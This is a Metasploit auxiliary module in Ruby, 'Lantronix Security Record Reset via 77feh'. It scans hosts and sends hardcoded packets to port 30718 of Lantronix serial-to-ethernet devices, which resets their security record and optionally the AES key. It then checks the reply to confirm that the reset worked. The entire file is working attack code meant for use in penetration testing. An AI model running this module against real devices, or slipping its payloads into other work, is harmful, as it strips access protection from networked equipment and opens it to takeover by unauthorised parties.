##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::Udp
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Lantronix Security Record Reset via 77feh',
      'Description' => %q{
          This module resets security setup record from Lantronix serial-to-ethernet
        devices via the config port (30718/udp/tcp, enabled by default). Depending on
        version, it can preserve AES key.
      },
      'Author'      => 'kost',
      'License'     => MSF_LICENSE
    )

    register_options(
      [
        Opt::CHOST,
        Opt::RPORT(30718),
        OptBool.new('RESETAES', [false, "Reset AES part of security record", true]),
        OptString.new('IPPROTO', [ true, "What IP protocol to use (tcp/udp)", 'udp' ])
      ], self.class)
  end

  def run_host(ip)
    reset_sec = "\x00\x00\x00\xa1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x75\x62\x6c\x69\x63\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    reset_enh = "\x00\x00\x00\xc1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x75\x62\x6c\x69\x63\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    lsock = nil

    begin
      if datastore['IPPROTO'] == 'udp' then
        lsock = Rex::Socket::Udp.create( {
          'LocalHost' => datastore['CHOST'] || nil,
          'PeerHost'  => ip,
          'PeerPort'  => datastore['RPORT'],
          'Context'   =>
          {
            'Msf' => framework,
            'MsfExploit' => self
          }
        })
      else
        lsock = connect
      end

      if datastore['RESETAES'] then
        lsock.put(reset_enh)
      else
        lsock.put(reset_sec)
      end

      result = lsock.recvfrom(65535, 10) and result[1]
      res = result[0]
      vprint_status("#{rhost} - got #{Rex::Text.to_hex_dump(res)}")

      if res
        if res[0,4] == "\x00\x00\x00\xB1"
          print_good("#{rhost} - Successful reset of security record.")
        else
          print_status("#{rhost} - Unusual response from host")
        end
      end
    rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionRefused, ::IOError
      print_error("Connection error")
    rescue ::Interrupt
      raise $!
    rescue ::Exception => e
      print_error("Unknown error: #{e.class} #{e}")
    ensure
      lsock.close if lsock
    end

  end

end
